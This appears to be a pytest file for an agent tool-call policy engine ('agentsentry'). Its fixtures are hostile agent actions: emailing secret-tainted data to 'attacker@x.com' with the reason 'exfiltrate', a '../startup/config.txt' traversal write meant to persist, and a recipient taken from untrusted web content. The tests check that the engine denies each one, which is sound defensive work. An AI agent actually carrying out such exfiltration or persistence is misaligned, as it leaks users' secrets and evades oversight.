from __future__ import annotations

from agentsentry.models import DataValue, Integrity, Label, ToolAction
from agentsentry.policy import PolicyEngine, derive_task_spec, label_for_path


def test_task_spec_blocks_email_for_summary(policy):
    spec = derive_task_spec("Summarize the webpage.", policy.sensitive_assets)
    assert "read_webpage" in spec.allowed_tools
    assert "send_email" in spec.forbidden_tools


def test_secret_to_untrusted_email_is_denied(policy):
    engine = PolicyEngine(policy)
    spec = derive_task_spec("Summarize the webpage.", policy.sensitive_assets)
    secret = DataValue(value="secret", label=label_for_path("secret.txt", policy))
    action = ToolAction(tool="send_email", args={"recipient": "attacker@x.com", "body": secret}, reason="exfiltrate")
    decision = engine.decide(action, spec, sentry_score=40)
    assert decision.decision == "deny"
    assert "body contains secret-tainted data" in decision.violations
    assert any("not allowlisted" in item for item in decision.violations)


def test_allowlisted_requested_email_can_pass(policy):
    engine = PolicyEngine(policy)
    spec = derive_task_spec("Send email to user@example.com.", policy.sensitive_assets)
    action = ToolAction(
        tool="send_email",
        args={"recipient": "user@example.com", "body": "hello"},
        reason="requested",
    )
    decision = engine.decide(action, spec, sentry_score=0)
    assert decision.decision in {"allow", "ask"}
    assert not decision.violations


def test_write_traversal_is_denied(policy):
    engine = PolicyEngine(policy)
    spec = derive_task_spec("Write a report.", policy.sensitive_assets)
    action = ToolAction(tool="write_file", args={"path": "../startup/config.txt", "content": "x"}, reason="persist")
    decision = engine.decide(action, spec, sentry_score=0)
    assert decision.decision == "deny"
    assert any("system or traversal" in item for item in decision.violations)


def test_untrusted_recipient_label_denied(policy):
    engine = PolicyEngine(policy)
    spec = derive_task_spec("Send email to user@example.com.", policy.sensitive_assets)
    recipient = DataValue(value="user@example.com", label=Label(source="web", integrity=Integrity.UNTRUSTED, tainted=True))
    action = ToolAction(tool="send_email", args={"recipient": recipient, "body": "hello"}, reason="web-supplied recipient")
    decision = engine.decide(action, spec, sentry_score=0)
    assert decision.decision == "deny"
    assert "recipient is not trusted" in decision.violations
